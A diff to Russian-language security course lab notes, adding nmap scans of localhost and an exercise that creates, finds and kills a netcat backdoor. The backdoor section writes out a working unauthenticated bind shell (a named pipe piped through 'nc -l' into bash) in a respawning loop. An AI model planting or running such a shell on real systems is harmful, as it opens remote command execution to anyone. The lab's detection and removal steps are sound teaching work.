@@ -72,6 +72,7 @@
 
 3) Определите категорию АС: сайт статической верстки, обновление выполняется по FTP.
 
+### Основные требования к АС
 
 Идентификация, проверка подлинности и контроль доступа субъектов
 
@@ -195,11 +196,100 @@
 
 # Лабораторные работы: Развертывание шлюза и сетей предприятия
 
+## Работа с nmap
+
+	student@PC / $ nmap localhost
+
+	Starting Nmap 7.40 ( https://nmap.org ) at 2020-10-12 18:03 +05
+	Nmap scan report for localhost (127.0.0.1)
+	Host is up (0.000084s latency).
+	Other addresses for localhost (not scanned): ::1
+	Not shown: 995 closed ports
+	PORT     STATE SERVICE
+	22/tcp   open  ssh
+	25/tcp   open  smtp
+	80/tcp   open  http
+	631/tcp  open  ipp
+	8081/tcp open  blackice-icecap
+
+	Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
+	student@PC / $ nmap -A localhost
+
+	Starting Nmap 7.40 ( https://nmap.org ) at 2020-10-12 18:03 +05
+	Nmap scan report for localhost (127.0.0.1)
+	Host is up (0.000081s latency).
+	Other addresses for localhost (not scanned): ::1
+	Not shown: 995 closed ports
+	PORT     STATE SERVICE  VERSION
+	22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 34:ca:ed:e8:f9:61:1d:4a:6f:35:20:04:1e:2c:6c:a1 (RSA)
+	|_  256 12:15:e1:57:9a:92:98:0c:9f:bd:9b:0a:b1:29:bc:8e (ECDSA)
+	25/tcp   open  smtp     Exim smtpd 4.89
+	| smtp-commands: PC Hello localhost [127.0.0.1], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, 
+	|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
+	80/tcp   open  http     Apache httpd 2.4.25 ((Debian))
+	|_http-server-header: Apache/2.4.25 (Debian)
+	|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+	631/tcp  open  ipp      CUPS 2.2
+	| http-methods: 
+	|_  Potentially risky methods: PUT
+	| http-robots.txt: 1 disallowed entry 
+	|_/
+	|_http-server-header: CUPS/2.2 IPP/2.1
+	|_http-title: Home - CUPS 2.2.1
+	8081/tcp open  backdoor No-auth shell (**BACKDOOR**)
+	Service Info: Host: PC; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
+
+## Cозздание бэкдора
+	student@PC / $ cd /tmp
+	student@PC /tmp/ $ mkfifo fifo_file
+	student@PC /tmp/ $ cat fifo_file | nc -l -p 8080 | bash > fifo_file
+
+	while true
+	do
+		cat fifo_file | nc -l -p 8080 | bash > fifo_file	
+	done
+	
+## Устранение бэкдора
+	student@PC / $ netstat -apn | grep 8080
+	(Not all processes could be identified, non-owned process info
+	 will not be shown, you would have to be root to see it all.)
+	tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      29656/nc            
+	student@PC / $ ps fax | grep 29656
+	29779 pts/2    S+     0:00  |   |   \_ grep --color=auto 29656
+	29656 pts/4    S+     0:00  |       \_ nc -l -p 8080
+	student@PC / $ ps fax | grep -B 3 29656
+	 4943 pts/1    Ss+    0:00  |   \_ bash
+	12740 pts/2    Ss     0:00  |   \_ bash
+	29788 pts/2    R+     0:00  |   |   \_ ps fax
+	29789 pts/2    S+     0:00  |   |   \_ grep --color=auto -B 3 29656
+	16188 pts/3    Ss+    0:00  |   \_ bash
+	29186 pts/4    Ss     0:00  |   \_ bash < родитель
+	29655 pts/4    S+     0:00  |       \_ cat aa
+	29656 pts/4    S+     0:00  |       \_ nc -l -p 8080
+	^^^^^ PID бэкдора
+	student@PC / $ kill 29656 бэкдор перезапустился
+	student@PC / $ kill 29186 
+	student@PC / $ kill -9 29186 бэкдор уничтожен
+	student@PC / $ netstat -apn | grep 8080
+								пусто!
+	student@PC / $ nmap localhost
+	Not shown: 996 closed ports
+	PORT    STATE SERVICE
+	22/tcp  open  ssh
+	25/tcp  open  smtp
+	80/tcp  open  http
+	631/tcp open  ipp
+															Порта 8080 нет в списке!
+
 ## Настройка шлюза для подключения сети предприятия к Internet
 
 [Обеспечение работоспособности и защиты межсетевого экрана с помощью iptables](https://clck.ru/RLqPk)
 
-![qr-code-a](qr-code-a.gif)
+[Проброс портов в локальную сеть с помощью iptables](https://clck.ru/RMGKn)
 
 1) Изучить литературу по ссылке.
 
